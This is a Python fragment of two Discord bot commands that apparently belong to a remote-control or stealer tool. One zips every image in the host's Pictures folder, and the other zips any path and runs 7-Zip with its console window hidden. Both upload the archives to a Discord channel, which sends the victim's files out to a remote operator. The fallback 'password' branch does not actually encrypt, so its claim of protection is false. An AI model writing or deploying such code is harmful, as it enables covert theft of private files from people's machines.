@bot.command(name="imgzip")
async def imgzip(ctx, *, folder=None):
    try:
        folder = os.path.expanduser(folder or "~/Pictures")
        if not os.path.isdir(folder):
            return await ctx.reply("no pictures folder")
        zpath = os.path.join(WORK_DIR, f"images_{uuid.uuid4().hex[:6]}.zip")
        n = 0
        with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
            for root, _, files in os.walk(folder):
                for f in files:
                    if f.lower().endswith((".png", ".jpg", ".jpeg", ".gif", ".bmp")):
                        z.write(os.path.join(root, f), f); n += 1
        await ctx.reply(f"zipped {n} images", file=discord.File(zpath, os.path.basename(zpath)))
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


@bot.command(name="zip-pw")
async def zip_pw(ctx, path: str, pw: str):
    try:
        path = os.path.expanduser(path)
        out  = os.path.join(WORK_DIR, f"enc_{uuid.uuid4().hex[:6]}.zip")
        seven = shutil.which("7z") or shutil.which("7za")
        if seven:
            subprocess.run([seven, "a", "-tzip", "-p" + pw, "-mem=AES256", out, path + os.sep + "*"],
                           capture_output=True, creationflags=0x08000000)
        else:
            z = zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED)
            for r, _, files in os.walk(path):
                for f in files:
                    full = os.path.join(r, f)
                    z.write(full, os.path.relpath(full, path))
            z.setpassword(pw.encode())
            z.close()
        await ctx.reply(f"zip-pw → `{out}` (pw inside)",
                        file=discord.File(out, os.path.basename(out)) if os.path.exists(out) else None)
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


